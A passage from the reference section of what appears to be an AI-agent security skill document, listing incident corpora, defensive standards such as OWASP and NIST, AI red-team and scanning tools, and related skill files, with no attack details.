- **ChatGPT plugin prompt injection** (2023-2024 corpus)
- **Simbian "AI-Goofed" agent incident corpus** (2024-2025)

### 12.3 Defensive references

- **OWASP LLM Top 10** — [owasp.org/www-project-top-10-for-large-language-model-applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- **OWASP Agentic Security Initiative** — [owasp.org/www-project-agentic-security](https://owasp.org/www-project-agentic-security/)
- **NIST AI RMF** — [nist.gov/itl/ai-risk-management-framework](https://www.nist.gov/itl/ai-risk-management-framework)
- **MCP specification** — [modelcontextprotocol.io](https://modelcontextprotocol.io/)
- **Anthropic Agent Skills standard** — [Anthropic Engineering](https://www.anthropic.com/engineering)

### 12.4 Open-source tooling

- **HexStrike AI** — multi-agent AI red-team orchestrator (9.6k stars)
- **AI-Infra-Guard** — AI infrastructure scanner (3.9k stars)
- **PentestGPT** — LLM-guided pentest orchestrator (13.7k stars)
- **mcp-scan** — MCP server security scanner
- **MCP Inspector** — official MCP debugging client
- **PromptInject** — prompt-injection attack framework
- **garak** — LLM vulnerability scanner (agent probes)

### 12.5 Adjacent kali-claw skills

- `skills/llm-red-team/SKILL.md` — LLM-as-target (stateless) red teaming
- `skills/ai-security/SKILL.md` — broader AI/LLM security survey
- `skills/mcp-server-patterns/SKILL.md` — defensive MCP server build pattern
- `skills/multi-agent-collaboration/SKILL.md` — coordinator's skill for multi-agent systems
- `skills/autonomous-loops/SKILL.md` — defensive pattern for autonomous agent loops
- `skills/safety-guard/SKILL.md` — defensive policy layer
- `skills/api-security/SKILL.md` — API-endpoint discovery (Phase 2 recon)
- `skills/supply-chain-security/SKILL.md` — MCP supply chain
- `skills/container-security/SKILL.md` — agent sandbox hardening
- `skills/threat-hunting/SKILL.md` — agent control-plane detections
